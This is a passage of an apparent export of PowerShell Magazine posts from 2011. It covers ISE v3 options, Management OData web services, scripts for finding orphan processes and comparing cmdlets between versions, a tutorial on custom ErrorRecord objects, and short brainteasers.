new to ISE v3 but the option to disable them is. If you don’t like to see the line numbers along with the script code, you can disable it by setting $psise.Options.ShowLineNumbers to $false. Also, make a note that the #region and #endregion are case sensitive.\nShowDefaultSnippets PowerShell ISE v3 supports code snippets like its 3rd-party counterparts. You can press Ctrl+J to bring up a tiny drop-down menu and select a code snippet from that list.\nThis can be disabled by setting:\n$psISE.Options.ShowDefaultSnippets = $false XmlTokenColors PowerShell ISE v3 supports XML syntax highlighting and the XML token colors can be changed by updating $psise.Options.XmlTokenColors hash.\nAll changes to $psise.Options persist over ISE restart and hence we don’t really need the old trick of using ISE profile to reconfigure the properties every time we open ISE. Make a note that for the changes to persist, ISE has to exit in a graceful manner. In case of a crash, the new changes will not be saved. And, if you want to reset all these properties to their defaults, you can use $psISE.Options.RestoreDefaults() method. This resets all $psise.Options to what is available in $psise.Options.DefaultOptions.\nIn summary, PowerShell ISE in version 3 brings in lot of goodness. Given the extensible aspects of PowerShell ISE object model, there will be lot of additional features added by the community. In this article, we just saw only a subset of changes to PowerShell Integrated Scripting Environment in version 3. And, we looked only at the $psise.Options object and what has changed underneath this object alone. There is more!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/28/powershell-v3-ise-and-ise-scripting-model-changes-improvements/","tags":["News","PowerShell ISE"],"title":"PowerShell v3 ISE and ISE scripting model changes \u0026 improvements"},{"categories":["Interviews"],"contents":"Jeffrey Snover is the inventor of PowerShell and I\u0026rsquo;ve always wanted to ask him what is his all time favorite trick in PowerShell.\nIs there something that you wanted to ask? Jeffrey will be answering a few selected questions from here in the first edition of PowerShell Magazine.\nSo, here is your chance.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/25/do-you-have-any-questions-for-jeffrey-snover/","tags":["Interviews"],"title":"Do you have any questions for Jeffrey Snover?"},{"categories":["News"],"contents":"With the release of Windows 8 and PowerShell V3 CTP1, Microsoft added Management ODATA Web Services Dev. Tools which lets you create PowerShell web services.\nWhat is Management OData? Management OData is an infrastructure for creating a web service endpoint that exposes your PowerShell cmdlets and scripts, as OData Web service entities.\nOData (Open Data Protocol) is a Web protocol for querying and updating data that provides a way to unlock your data and free it from silos that exist in applications today. OData presents resources as a set of database-like tables with a definite schema. OData does this by applying and building upon Web technologies such as HTTP, Atom Publishing Protocol (AtomPub) and JSON to provide access to information from a variety of applications, services, and stores.\nGood news, PowerShell V3 supports consuming JSON out of the box.\nExamples The tools provide a walkthrough creating two endpoints, one for Processes and the other for Services. They use Get-Process, Get-Service, and Set-Service under the covers. Once setup, you can access it this way:\nhttp://localhost:7000/MODataSvc/Microsoft.Management.Odata.svc/Processes\nFor this to work you need to install Windows Server vNext.\nMore Technical Details A Management OData server uses two types of schema files to define its resources: a public schema and a private schema. It defines its resources in terms of the CIM model using the MOF file format. Internally translates these resource definitions into the CSDL format that is used by the ODATA protocol.\nThe Management ODATA feature exposes a structured, data-oriented schema on top of PowerShell artifacts.\nThe tools supplied assists in the creation of these files.\nConclusion Being able to whip up scripts and expose their results to the web as Urls supplying a JSON format is a big deal. For example, Twitter provides search results as JSON as does Facebook.\nNow it is possible to deliver data from existing sources or repurpose it by combining sources and presenting over the Web in a well-known format.\nIn turn it can be used by applications like:\n Other PowerShell scripts Windows Phone 7 (Mango) PHP (WordPress Blogs) Java and Andriod applications iPad/iPhone applications Drupal Joomla  PowerShell keeps getting better and better.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/24/powershell-vnext-web-service-entities/","tags":["News"],"title":"PowerShell vNext – Web Service Entities"},{"categories":["Wallpapers"],"contents":"Some PowerShell wallpapers I created over the years to decorate my desktop and wanted to share them with you. If you have some of your own that you want to share with the community, send them over and we’ll add them to this page. Have fun 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/23/powershell-wallpapers/","tags":["Wallpapers"],"title":"PowerShell Wallpapers"},{"categories":["Tips and Tricks"],"contents":"Some processes start child processes; they are set up that way. Sometimes, when the parent process stops, or it is stopped, some of the child processes remain running. That can be by design, but in some cases the orphan process needs to be terminated as well.\nThe first step in determining if a running process is an orphan process is to check if it has a parent process. Next, we need to check if the parent process is running or not; this can cause a problem though (more on this later). If the parent process is not running, we got ourselves an orphan process.\nFirst things first, let\u0026rsquo;s determine if a process has a parent process. It is not easy to achieve this task with the Get-Process cmdlet because the System.Diagnostics.Process object does not have a Parent* property. That is fine—we can take the Windows Management Instrumentation (WMI) route. The Win32_Process class is used to retrieve running processes, we just need to pass it to the Get-WmiObject cmdlet. The objects returned do have a ParentProcessID property, exactly what we are looking for.\nNext, we have to resolve the parent process’ state, whether it is running or not. The process of interest’s ParentProcessID value can also help us with this task, but it will not be a straight forward solution. The problem arises if the parent process is not running and its ID, stored in the potentially orphaned process, was assigned to a new process that is not related to the process of interest. To ensure that the process that has the ParentProcessID as its ID is the parent, we will compare its creation time against that of our process of interest. If our process was started—or created—after the possible parent process creation time, the parent is legitimate, it is not a foster parent.\nCreating the filter we will apply to all running process sounds complicated but it is easy to understand. Basically, we will ask PowerShell to filter through the piped process object if…\n it has a ParentProcessID but its parent process is not running, or its creation time is less than the prospective parent process’ creation time, that is, it started before the substitute parent  Finally, any process object that goes through the filter is piped and bound to the Get-Process cmdlet via its ProcessID value. This way we have the list of orphan System.Diagnostics.Process objects.\nHere is the Get-OrphanProcess script:\n# WMI class instace to convert WMI time to DateTime $wmi = [WMI] # retrieve and filter running processes Get-WmiObject Win32_Process | Where-Object { # attempt to retrieve the piped process\u0026#39; parent process $parent = Get-WmiObject Win32_Process -Filter \u0026#34;ProcessID=\u0026#39;$($_.ParentProcessID)\u0026#39;\u0026#34; # get the piped process, as well as its parent\u0026#39;s, creation time $creationDate, $parentCreationDate = $( # if piped process has a parent and its parent is running if ($_.ParentProcessID -and $parent) { # convert their the WMI creation time to DateTime $wmi.ConvertToDateTime($_.CreationDate),$wmi.ConvertToDateTime($parent.CreationDate) } else { # return Null $null, $null } ) # filter piped process through if its parent process is not running or # its creation time happened before the parent process was started -not $parent -or $creationDate -lt $parentCreationDate # pipe the filtered process to Get-Process binding it via its ProcessID } | Get-Process -ID { $_.ProcessID} # clean up Remove-Variable wmi, parent,creationDate, parentCreationDate Now that we have a list of the orphan ones, we can filter further and do with them what we find appropriate. To kill or not to kill, that is the question.\nLet me demonstrate. Let’s suppose the Get-OrphanProcess.ps1 script is located in C:\\Scripts (it could be anywhere, really, just change the call to the script in the sample code accordingly); we will use it to retrieve an orphan calc process we will start from a non-interactive PowerShell session that will also output its process ID before it exits. Here is the code and the output it returned. Try it!\n\u0026amp; { $VerbosePreference = \u0026#39;Continue\u0026#39; Stop-Process -Name calc -ErrorAction SilentlyContinue $parentProcessId = PowerShell -NoProfile -NonInteractive -Command {$pid; Start-Process -FilePath calc.exe} $orphanCalcId = (Get-Process -Name calc).Id $orphanCalcParentId = (Get-WmiObject Win32_Process -Filter \u0026#34;ProcessID = \u0026#39;\u0026#39;$orphanCalcId\u0026#39;\u0026#34;).ParentProcessID Write-Verbose \u0026#34;Parent or spawner process ID: $parentProcessId\u0026#34; Write-Verbose \u0026#34;Orphan calc\u0026#39;s parent process ID: $orphanCalcParentId\u0026#34; Write-Verbose \u0026#34;Are they equal?’ $($parentProcessId -eq $orphanCalcParentId)\u0026#34; Write-Verbose \u0026#34;Orphan calc\u0026#39;s process ID: $orphanCalcId\u0026#34; Write-Verbose \u0026#39;Starting another calc process\u0026#39; Start-Process -FilePath calc.exe Write-Verbose \u0026#39;Here are the running calc processes. One is an orphan process.\u0026#39; Get-Process -Name calc Write-Verbose \u0026#39;Here is the orphan calc process.\u0026#39; C:\\Scripts\\Get-OrphanProcess.ps1 | Where-Object {$_.ProcessName -eq \u0026#39;calc\u0026#39;} } VERBOSE: Parent or spawner process ID: 7448 VERBOSE: Orphan calc\u0026#39;s parent process ID: 7448 VERBOSE: Are they equal?\u0026#39; True VERBOSE: Orphan calc\u0026#39;s process ID: 2312 VERBOSE: Starting another calc process VERBOSE: Here are the running calc processes. One is an orphan process. Handles NPM(K) PM(K) WS(K) VM(M) CPU(s) Id ProcessName ------- ------ ----- ----- ----- ------ -- ----------- 69 14 6860 12132 85 0.03 2312 calc 38 6 1584 3388 60 0.02 3116 calc VERBOSE: Here is the orphan calc process. 74 19 7344 13628 83 0.05 2312 calc ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/22/rally-the-orphan-processes/","tags":["Tips and Tricks"],"title":"Rally the orphan processes"},{"categories":["News"],"contents":"Wassim Fayed [MSFT] has published the source code for the Cmdlet Help Editor on CodePlex.\nCmdlet Help Editor enables you to create help topics for Windows PowerShell cmdlets and in the XML format that Windows PowerShell reads. Help text created in Cmdlet Help Editor can be displayed immediately by a Windows PowerShell Get-Help command without any additional transforms or formatting. By reflecting on a Windows PowerShell snap-in (PsSnapin) assembly and modules, Cmdlet Help Editor creates a customized documentation interface that includes the cmdlets in the module, their parameters, and parameter attributes.\nThe first edition of the Cmdlet Help Editor was designed for Windows PowerShell cmdlet developers to make it easy to create cmdlet help. The second version added support for PowerShell V2 and scripters could use it to write help files for modules. Now that the source code is published on CodePlex the community can add its own contributions to it!\nThe latest version of the Cmdlet Help Editor can be downloaded HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/22/cmdlet-help-editor-was-released-on-codeplex/","tags":["News"],"title":"Cmdlet Help Editor was released on CodePlex"},{"categories":["News"],"contents":"Have you tried PowerShell vNext included as a part of Windows 8 client and server developer preview? Don’t have a Windows 8 system to look at it just yet?\nDon’t worry! Microsoft [just announced the release][1] of Windows Management Framework 3.0 CTP1 build. This includes PowerShell vNext. This package also contains updated WMI and WinRM components. This release can be installed on Windows 7 SP1 and Windows Server 2008 R2 SP1. The below list — from the release page — shows some of the improvements or additions to PowerShell in this release.\nWindows PowerShell 3.0 Some of the new features in Windows PowerShell 3.0 include:\n  Workflows\nWorkflows that run long-running activities (in sequence or in parallel) to perform complex, larger management tasks, such as multi-machine application provisioning. Using the Windows Workflow Foundation at the command line, Windows PowerShell workflows are repeatable, parallelizable, interruptible, and recoverable.\n  Robust Sessions\nRobust sessions that automatically recover from network failures and interruptions and allow you to disconnect from the session, shut down the computer, and reconnect from a different computer without interrupting the task.\n  Scheduled Jobs\nScheduled jobs that run regularly or in response to an event.\n  Delegated Administration\nCommands that can be executed with a delegated set of credentials so users with limited permissions can run critical jobs\n  Simplified Language Syntax\nSimplified language syntax that make commands and scripts look a lot less like code and a lot more like natural language.\n  Cmdlet Discovery\nImproved cmdlet discovery and automatic module loading that make it easier to find and run any of the cmdlets installed on your computer.\n  Show-Command\nShow-Command, a cmdlet and ISE Add-On that helps users find the right cmdlet, view its parameters in a dialog box, and run it.\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/20/windows-management-framework-3-0-community-technology-preview-ctp-1-is-here/","tags":["News"],"title":"Windows Management Framework 3.0 Community Technology Preview (CTP) 1 is here"},{"categories":["Tips and Tricks"],"contents":"Windows 8 Developer Preview (pre-beta version) was released for public at the BUILD conference (you can download it HERE) and it is packaged with PowerShell v3 and a ton of goodies! One aspect that I usually check when a new version is released is which new cmdlets were added and what parameters has been added or removed.\nTo find all the changes between the two versions of PowerShell (v2 and v3) I put together a script that produces a list of commands and parameters. To compare the changes I run a command, on each version of PowerShell , that exports all core cmdlets (cmdlet name and a list of parameters) to an XML file using the Export-CliXml cmdlet.\nOnce the XML files have been created I import them back using the Import-CliXml cmdlet and then look at the differences. The script can be used, with some modifications, to find differences in other areas too- aliases, automatic and environment variables, specific module cmdlets and so on. Take the time to experiment with it.\nUPDATE\nThere seems to be an issue with the command I used to export cmdlets and parameters in Windows 8 (works fine in v2).\nFor some reason, some cmdlets do not have a value in the Parameters column.\nTo resolve this I modified the expression to get the parameters and added a second call to Get-Command.\nThe new expression I used (post code is updated as well as the result). @mjolinor, thanks :for the comment!\nGet-Command -Module Microsoft.PowerShell.\\*, Microsoft.WSMan.\\* | Select-Object -Property Name,@{Name=\u0026#39;Parameters\u0026#39;;Expression={(Get-Command $_).Parameters.Keys}} The old expression was: ;Expression={$_.Parameters.Keys}}\n# run in v2, export all core cmdlets, name and parameters Get-Command -Module Microsoft.PowerShell.*, Microsoft.WSMan.* | Select-Object -Property Name, @{Name=’Parameters’;Expression={(Get-Command $_).Parameters.Keys}} | Export-Clixml .\\v2.xml # run in v3, export all core cmdlets, name and parameters\u0026lt;/span\u0026gt; Get-Command -Module Microsoft.PowerShell.*, Microsoft.WSMan.* | Select-Object -Property Name ,@{Name=’Parameters’;Expression={(Get-Command $_).Parameters.Keys}} | Export-Clixml .\\v3.xml # run either in v2 or v3 console\u0026lt;/span\u0026gt; $v2 = Import-CliXml .\\v2.xml | Sort-Object -Property Name $v3 = Import-CliXml .\\v3.xml | Sort-Object -Property Name Compare-Object $v2 $v3 -Property Name -IncludeEqual -PassThru | ForEach-Object { $Command = $_ if($_.SideIndicator -eq \u0026#39;==\u0026#39;) { $Command=$_ $cv2 = $v2 | Where-Object { $_.Name -eq $Command.Name} | Select-Object -ExpandProperty Parameters $cv3 = $v3 | Where-Object { $_.Name -eq $Command.Name} | Select-Object -ExpandProperty Parameters $compare = Compare-Object $cv2 $cv3 if ($compare) { try { $NewParameters = $compare | Where-Object { $_.SideIndicator -eq \u0026#39;=\u0026gt;\u0026#39; } | ForEach-Object { $_.InputObject + \u0026#39; (+)\u0026#39;} $RemovedParameters = $compare | Where-Object { $_.SideIndicator -eq \u0026#39;=\u0026lt;\u0026#39; } | ForEach-Object { $_.InputObject + \u0026#39; (-)\u0026#39;} \u0026#34;$($command.Name)(!)\u0026#34; $NewParameters + $RemovedParameters | Sort-Object | ForEach-Object { \u0026#34;`t$_\u0026#34; } \u0026#34;`n\u0026#34; } catch{} } } elseif ($_.SideIndicator -eq \u0026#39;=\u0026gt;\u0026#39;) { \u0026#34;$($Command.name)(+)`n\u0026#34; } else { \u0026#34;($Command.name) (-)`n\u0026#34; } } Result legend: ! = Changed, + = New, and - = Removed\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/15/how-to-find-out-whats-new-in-powershell-vnext/","tags":["Tips and Tricks"],"title":"How to find out what’s new in PowerShell vNext"},{"categories":["How To"],"contents":"The most common ways of reporting errors in PowerShell are through the Write-Error Cmdlet or the Throw statement. Write-Error writes non-terminating errors while the throw statement writes terminating errors which halt execution but are not very descriptive. Both methods write Management.Automation.ErrorRecord objects to the error stream. Write-Error lets you customize the ErrorRecord it reports through its parameters; this allows you to provide tailored specifics about an error, assisting the user to avoid or resolve the reason that caused the problem. In contrast, the Throw statement only lets us provide a custom message, which in some cases could be enough.\nCustom ErrorRecord objects are not very common, but if you ever want to provide better details about an error that is not very clear, you can create and report your own. For instance, I wrote a function that appends data to an existing CSV file; before any piped input is processed, the function will report one of three custom ErrorRecord objects as a terminating error if the destination -or target- file:\n does not exist is empty, or has a different character encoding than the specified -or default- encoding  After the piped input is processed but before the processed data is written to disk, the function compares the original header fields against the processed data header fields, if any inconsistency is found the function reports the fourth custom ErrorRecord and stops execution without appending the processed data.\nI could have used a Throw statement to report the problem and stop execution, but decided to make my advanced function behave more professionally with custom ErrorRecord objects.\nPowerShell 2.0 introduced advanced functions which are very similar to Cmdlets. Through advanced functions, we haves access to most members of the PSCmdlet Class. The object through which we have access to these members is the $PSCmdlet object, which is only available in advanced functions. The $PSCmdlet object lets us report a terminating error through its ThrowTerminatingError method which takes one argument, an ErrorRecord. To construct an ErrorRecord we need four arguments:\n [System.Exception]$exception  The Exception that will be associated with the ErrorRecord   [System.String]$errorId  A scripter-defined identifier of the error. This identifier must be a non-localized string for a specific error type.   [Management.Automation.ErrorCategory]$errorCategory  An ErrorCategory enumeration that defines the category of the error.   [System.Object]$targetObject  The object that was being processed when the error took place.    Notice that the first argument is a System.Exception, this is the object from which all Exception objects derive from. There are three ways to construct most Exception objects, one that takes no arguments, just the full name of the exception; another that takes one argument:\n [System.String]$message  Describes the Exception to the user.    …and the third one that takes two arguments:\n [System.String]$message  Describes the Exception to the user.   [System.Exception]$innerException  The Exception instance that caused the Exception association with the ErrorRecord.    Did you notice that the last argument is also a System.Exception? Some Exception objects have either customized constructors or no constructors at all; those Exception objects are the exception, if you know what I mean, so will stick with the regulars.\nThis code snippet shows how you would report a terminating error in an advanced function:\n$message = \u0026#34;File \u0026#39;$Path\u0026#39; is empty.\u0026#34; $exception = New-Object InvalidOperationException $message $errorID = \u0026#39;FileIsEmpty\u0026#39; $errorCategory = [Management.Automation.ErrorCategory]::InvalidOperation $target = $Path $errorRecord = New-Object Management.Automation.ErrorRecord $exception, $errorID, $errorCategory, $target $PSCmdlet.ThrowTerminatingError($errorRecord) …first the Exception, next the ErrorRecord and finally report the ErrorRecord.\nTo make the custom ErrorRecord creation process a bit simpler, I wrote the New-ErrorRecord function…\n\u0026lt;# .SynopsisCreates an custom ErrorRecord that can be used to report a terminating or non-terminating error. .DescriptionCreates an custom ErrorRecord that can be used to report a terminating or non-terminating error. .ParameterException The Exception that will be associated with the ErrorRecord. .ParameterErrorID A scripter-defined identifier of the error. This identifier must be a non-localized string for a specific error type. .ParameterErrorCategory An ErrorCategory enumeration that defines the category of the error. .ParameterTargetObject The object that was being processed when the error took place. .ParameterMessage Describes the Exception to the user. .ParameterInnerException The Exception instance that caused the Exception association with the ErrorRecord. .Example# advanced functions for testing function Test-1 { [CmdletBinding()] param( [Parameter(Mandatory = $true, ValueFromPipeline = $true)] [String] $Path ) process { foreach ($_path in $Path) { $content = Get-Content -LiteralPath $_path -ErrorAction SilentlyContinue if (-not $content) { $errorRecord = New-ErrorRecord InvalidOperationException FileIsEmpty InvalidOperation $_path -Message \u0026#34;File \u0026#39;$_path\u0026#39; is empty.\u0026#34; $PSCmdlet.ThrowTerminatingError($errorRecord) } } } } function Test-2 { [CmdletBinding()] param( [Parameter(Mandatory = $true, ValueFromPipeline = $true)] [String] $Path ) process { foreach ($_path in $Path) { $content = Get-Content -LiteralPath $_path -ErrorAction SilentlyContinue if (-not $content) { $errorRecord = New-ErrorRecord InvalidOperationException FileIsEmptyAgain InvalidOperation $_path -Message \u0026#34;File \u0026#39;$_path\u0026#39; is empty again.\u0026#34; -InnerException $Error[0].Exception $PSCmdlet.ThrowTerminatingError($errorRecord) } } } } # code to test the custom terminating error reports Clear-Host $null = New-Item -Path .\\MyEmptyFile.bak -ItemType File -Force -Verbose Get-ChildItem *.bak | Where-Object {-not $_.PSIsContainer} | Test-1 Write-Host System.Management.Automation.ErrorRecord -ForegroundColor Green $Error[0] | Format-List * -Force Write-Host Exception -ForegroundColor Green $Error[0].Exception | Format-List * -Force Get-ChildItem *.bak | Where-Object {-not $_.PSIsContainer} | Test-2 Write-Host System.Management.Automation.ErrorRecord -ForegroundColor Green $Error[0] | Format-List * -Force Write-Host Exception -ForegroundColor Green $Error[0].Exception | Format-List * -Force Remove-Item .\\MyEmptyFile.bak -Verbose Description =========== Both advanced functions throw a custom terminating error when an empty file is being processed. -Function Test-2\u0026#39;s custom ErrorRecord includes an inner exception, which is the ErrorRecord reported by function Test-1. The test code demonstrates this by creating an empty file in the curent directory -which is deleted at the end- and passing its path to both test functions. The custom ErrorRecord is reported and execution stops for function Test-1, then the ErrorRecord and its Exception are displayed for quick analysis. Same process with function Test-2; after analyzing the information, compare both ErrorRecord objects and their corresponding Exception objects. -In the ErrorRecord note the different Exception, CategoryInfo and FullyQualifiedErrorId data. -In the Exception note the different Message and InnerException data. .Example$errorRecord = New-ErrorRecord System.InvalidOperationException FileIsEmpty InvalidOperation $Path -Message \u0026#34;File \u0026#39;$Path\u0026#39; is empty.\u0026#34; $PSCmdlet.ThrowTerminatingError($errorRecord) Description =========== A custom terminating ErrorRecord is stored in variable \u0026#39;errorRecord\u0026#39; and then it is reported through $PSCmdlet\u0026#39;s ThrowTerminatingError method. The $PSCmdlet object is only available within advanced functions. .Example$errorRecord = New-ErrorRecord System.InvalidOperationException FileIsEmpty InvalidOperation $Path -Message \u0026#34;File \u0026#39;$Path\u0026#39; is empty.\u0026#34; Write-Error -ErrorRecord $errorRecord Description =========== A custom non-terminating ErrorRecord is stored in variable \u0026#39;errorRecord\u0026#39; and then it is reported through the Write-Error Cmdlet\u0026#39;s ErrorRecord parameter. .InputsSystem.String .OutputsSystem.Management.Automation.ErrorRecord .LinkWrite-Error Get-AvailableExceptionsList .NotesName: New-ErrorRecord Author: Robert Robelo LastEdit: 08/24/2011 12:35 #\u0026gt; function New-ErrorRecord { param( [Parameter(Mandatory = $true, Position = 0)] [System.String] $Exception, [Parameter(Mandatory = $true, Position = 1)] [Alias(\u0026#39;ID\u0026#39;)] [System.String] $ErrorId, [Parameter(Mandatory = $true, Position = 2)] [Alias(\u0026#39;Category\u0026#39;)] [System.Management.Automation.ErrorCategory] [ValidateSet(\u0026#39;NotSpecified\u0026#39;, \u0026#39;OpenError\u0026#39;, \u0026#39;CloseError\u0026#39;, \u0026#39;DeviceError\u0026#39;, \u0026#39;DeadlockDetected\u0026#39;, \u0026#39;InvalidArgument\u0026#39;, \u0026#39;InvalidData\u0026#39;, \u0026#39;InvalidOperation\u0026#39;, \u0026#39;InvalidResult\u0026#39;, \u0026#39;InvalidType\u0026#39;, \u0026#39;MetadataError\u0026#39;, \u0026#39;NotImplemented\u0026#39;, \u0026#39;NotInstalled\u0026#39;, \u0026#39;ObjectNotFound\u0026#39;, \u0026#39;OperationStopped\u0026#39;, \u0026#39;OperationTimeout\u0026#39;, \u0026#39;SyntaxError\u0026#39;, \u0026#39;ParserError\u0026#39;, \u0026#39;PermissionDenied\u0026#39;, \u0026#39;ResourceBusy\u0026#39;, \u0026#39;ResourceExists\u0026#39;, \u0026#39;ResourceUnavailable\u0026#39;, \u0026#39;ReadError\u0026#39;, \u0026#39;WriteError\u0026#39;, \u0026#39;FromStdErr\u0026#39;, \u0026#39;SecurityError\u0026#39;)] $ErrorCategory, [Parameter(Mandatory = $true, Position = 3)] [System.Object] $TargetObject, [Parameter()] [System.String] $Message, [Parameter()] [System.Exception] $InnerException ) begin { # check for required function, if not defined... if (-not (Test-Path function:Get-AvailableExceptionsList)) { $message1 = \u0026#34;The required function Get-AvailableExceptionsList is not defined. \u0026#34; + \u0026#34;Please define it in the same scope as this function\u0026#39;s and try again.\u0026#34; $exception1 = New-Object System.OperationCanceledException $message1 $errorID1 = \u0026#39;RequiredFunctionNotDefined\u0026#39; $errorCategory1 = \u0026#39;OperationStopped\u0026#39; $targetObject1 = \u0026#39;Get-AvailableExceptionsList\u0026#39; $errorRecord1 = New-Object Management.Automation.ErrorRecord $exception1, $errorID1, $errorCategory1, $targetObject1 # ...report a terminating error to the user $PSCmdlet.ThrowTerminatingError($errorRecord1) } # required function is defined, get \u0026#34;available\u0026#34; exceptions $exceptions = Get-AvailableExceptionsList $exceptionsList = $exceptions -join \u0026#34;`r`n\u0026#34; } process { # trap for any of the \u0026#34;exceptional\u0026#34; Exception objects that made through the filter trap [Microsoft.PowerShell.Commands.NewObjectCommand] { $PSCmdlet.ThrowTerminatingError($_) } # verify input exception is \u0026#34;available\u0026#34;. if so... if ($exceptions -match \u0026#34;^(System\\.)?$Exception$\u0026#34;) { # ...build and save the new Exception depending on present arguments, if it... $_exception = if ($Message -and $InnerException) { # ...includes a custom message and an inner exception New-Object $Exception $Message, $InnerException } elseif ($Message) { # ...includes a custom message only New-Object $Exception $Message } else { # ...is just the exception full name New-Object $Exception } # now build and output the new ErrorRecord New-Object Management.Automation.ErrorRecord $_exception, $ErrorID, $ErrorCategory, $TargetObject } else { # Exception argument is not \u0026#34;available\u0026#34;; # warn the user, provide a list of \u0026#34;available\u0026#34; exceptions and... Write-Warning \u0026#34;Available exceptions are:`r`n$exceptionsList\u0026#34; $message2 = \u0026#34;Exception \u0026#39;$Exception\u0026#39; is not available.\u0026#34; $exception2 = New-Object System.InvalidOperationExceptionn $message2 $errorID2 = \u0026#39;BadException\u0026#39; $errorCategory2 = \u0026#39;InvalidOperation\u0026#39; $targetObject2 = \u0026#39;Get-AvailableExceptionsList\u0026#39; $errorRecord2 = New-Object Management.Automation.ErrorRecord $exception2, $errorID2, $errorCategory2, $targetObject2 # ...report a terminating error to the user $PSCmdlet.ThrowTerminatingError($errorRecord2) } } } …takes all the arguments used to build both an ErrorRecord and an Exception, six in all. The first four are required and the last two are optional. The function guards against nonexistent Exception objects but allows the absence of the ‘System.’ prefix from its Exception argument, adhering to PowerShell’s tolerance. You can omit or include the ‘System.’ prefix from the full name when creating an Exception object.\nThe function shields against nonexistent Exception objects by relying on a list of available Exception objects that is retrieved through another function, Get-AvailableExceptionsList. The Exception argument -which is of Type String, not Exception- is compared against the list to verify its availability. The other precaution in the New-ErrorRecord function is for those exceptional Exception objects that make the available list but have customized constructors, that is, different constructors from regular Exception objects. In either case, New-ErrorRecord reports a terminating error.\nThe Get-AvailableExceptionsList function…\n\u0026lt;# .SynopsisRetrieves all available Exceptions to construct ErrorRecord objects. .DescriptionRetrieves all available Exceptions in the current session to construct ErrorRecord objects. .Example$availableExceptions = Get-AvailableExceptionsList Description =========== Stores all available Exception objects in the variable \u0026#39;availableExceptions\u0026#39;. .ExampleGet-AvailableExceptionsList | Set-Content $env:TEMP\\AvailableExceptionsList.txt Description =========== Writes all available Exception objects to the \u0026#39;AvailableExceptionsList.txt\u0026#39; file in the user\u0026#39;s Temp directory. .InputsNone .OutputsSystem.String .LinkNew-ErrorRecord .NotesName: Get-AvailableExceptionsList Author: Robert Robelo LastEdit: 08/24/2011 12:35 #\u0026gt; function Get-AvailableExceptionsList { [CmdletBinding()] param() end { $irregulars = \u0026#39;Dispose|OperationAborted|Unhandled|ThreadAbort|ThreadStart|TypeInitialization\u0026#39; [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { $_.GetExportedTypes() -match \u0026#39;Exception\u0026#39; -notmatch $irregulars | Where-Object { $_.GetConstructors() -and $( $_exception = New-Object $_.FullName New-Object Management.Automation.ErrorRecord $_exception, ErrorID, OpenError, Target ) } | Select-Object -ExpandProperty FullName } 2\u0026gt; $null } } …retrieves all Type objects -from the assemblies in the current domain- whose names contain the word Exception but also excludes those whose names match part of some of the exceptional Exception objects’ names. Then, if the Exception has at least one constructor, the function outputs its full name. The function can be called independently to provide a list to select the adequate Exception object name before you create a custom ErrorRecord. This function must be defined before calling the New-ErrorRecord function.\nAfter defining both functions, the code snippet we previously used to report a terminating error in an advanced function becomes:\n$errorRecord = New-ErrorRecord System.InvalidOperationException FileIsEmpty ` InvalidOperation $Path -Message \u0026#34;File \u0026#39;$Path\u0026#39; is empty.\u0026#34; $PSCmdlet.ThrowTerminatingError($errorRecord) …a bit simpler.\nRemember, ErrorRecord objects are not just for terminating errors. To report a customized non-terminating ErrorRecord, create it with the function New-ErrorRecord and pass it to Write-Error through its ErrorRecord parameter:\n$errorRecord = New-ErrorRecord System.InvalidOperationException FileIsEmpty ` InvalidOperation $Path -Message \u0026#34;File \u0026#39;$Path\u0026#39; is empty.\u0026#34; Write-Error -ErrorRecord $errorRecord This is the least you need to know about custom ErrorRecord objects, and how to report them as terminating or non-terminating errors. I know -through personal experience- this topic can be unapproachable, I threw away the ten-foot pole and explored it closer; we are good friends now, but there is still more to discover. At least I feel that this information can help you create custom ErrorRecord objects to better inform the user.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/14/custom-errors/","tags":["How To"],"title":"Custom errors"},{"categories":["News"],"contents":"Idera, a well-known provider of Windows PowerShell management and administration solutions, today announced PowerShell Plus v4.1, the advanced Interactive Development Environment (IDE) for Windows PowerShell. The new version gives users more control over their scripting environment with Source Control Integration and an enhanced Scripting Object Model for automating most features in the IDE.\nPowerShell Plus is designed to help administrators and developers quickly master the PowerShell scripting language while dramatically increasing the productivity of both novice and expert users. PowerShell Plus v4.1 includes these new features:\n  Version control integration using MSCCI compliant plug-ins  150+ scriptable APIs for automating the IDE and managing the user options  50+ Hyper-V scripts using the Virtualization Management Interface  “PowerShell Plus has helped hundreds of thousands of Windows administrators execute on their ideas of how to better manage their IT environments,” said Rick Pleczko, President and CEO of Idera. “PowerShell 4.1 gives users even more customization and automation options to turn these once-grand ideas into Windows management reality.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/14/powershell-plus-v4-1-has-been-released/","tags":["News"],"title":"PowerShell Plus v4.1 Has Been Released!"},{"categories":["Brainteaser"],"contents":"Problem Without any loop statements or pipelines, get the numeric values of an Enum (such as IO.FileAttributes) in 1 statement.\nSolution [Enum]::GetValues(\u0026#39;IO.FileAttributes\u0026#39;) [Enum]::GetValues(\u0026#39;IO.FileAttributes\u0026#39;) -as \u0026#39;Long[]\u0026#39; Even though the numeric values of most Enum are of Int32, or Int (PowerShell\u0026rsquo;s Int32 Type Accelerator), casting the output of Enum’s GetValues method as an Array of Int32, or Int, does not return the numeric -or integer- values. But, if the cast is to another compatible Numeric Type we get the expected output.\nWinner: James Brundage ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2011/09/13/enums-numeric-values/","tags":["Brainteaser"],"title":"Enum’s numeric values"},{"categories":["Brainteaser"],"contents":" Problem Attain the value of a private variable declared in a child scope from that scope’s own child scope.\nSolution \u0026amp; { $Private:var = 7 \u0026amp; { Get-Variable var -Scope 1 -ValueOnly } } Declare the private variable var in a ScritBlock\u0026rsquo;s scope (let’s call it “Scope A”). Next, from the scope of an inner 